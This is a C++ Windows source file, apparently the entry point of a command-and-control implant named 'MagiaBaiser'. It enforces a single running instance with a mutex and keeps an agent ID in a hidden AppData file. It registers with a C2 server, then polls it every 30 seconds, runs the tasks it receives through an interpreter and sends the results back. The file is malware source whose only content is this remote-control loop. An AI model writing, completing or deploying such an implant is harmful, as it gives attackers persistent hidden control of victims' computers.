#include "buildoptions.h"
#include "functions.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
    CreateMutex(0, FALSE, L"Local\\$MagiaBaiser$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }
    PWSTR config_path;
    std::wstring agent_id;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_CREATE, NULL, &config_path);
    wcscat(config_path, L"\\MB\\.id");
    if (GetFileAttributes(config_path) != INVALID_FILE_ATTRIBUTES) {
        std::wifstream cfg_file(config_path);
        std::getline(cfg_file, agent_id);
    }
    else {  
        nlohmann::json registration = communication::RegisterAgent(C2);
        agent_id = registration["agent_id"].get<std::wstring>();
        std::wofstream cfg_file(config_path);
        cfg_file << agent_id;
    }

    while (true) {
        nlohmann::json task = communication::FetchTask(C2, agent_id);

        if (task.contains("task")) {
            nlohmann::json results;
            results["result"] = interpreter::InterpretTask(task["task"].get<std::wstring>());

            communication::SubmitResults(C2, agent_id, results);
        }

        Sleep(30000);
    }

    return 0;


}